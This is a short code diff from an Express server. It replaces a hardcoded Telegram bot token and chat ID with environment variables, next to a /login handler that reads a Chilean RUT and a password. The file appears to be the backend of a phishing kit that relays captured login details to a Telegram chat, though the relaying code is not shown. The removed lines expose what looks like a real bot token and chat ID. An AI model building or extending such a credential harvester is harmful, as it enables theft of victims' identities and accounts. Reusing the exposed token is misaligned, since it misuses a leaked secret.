@@ -6,8 +6,8 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // Aquí van tus credenciales de Telegram
-const TELEGRAM_TOKEN = "8278463397:AAGo2ZY5xthkffSKMPEd-69tIwz2sIXdQuE"; 
-const CHAT_ID = "7240166271"; 
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; 
+const CHAT_ID = process.env.CHAT_ID; 
 
 app.post("/login", async (req, res) => {
   const { rut, passwd } = req.body;
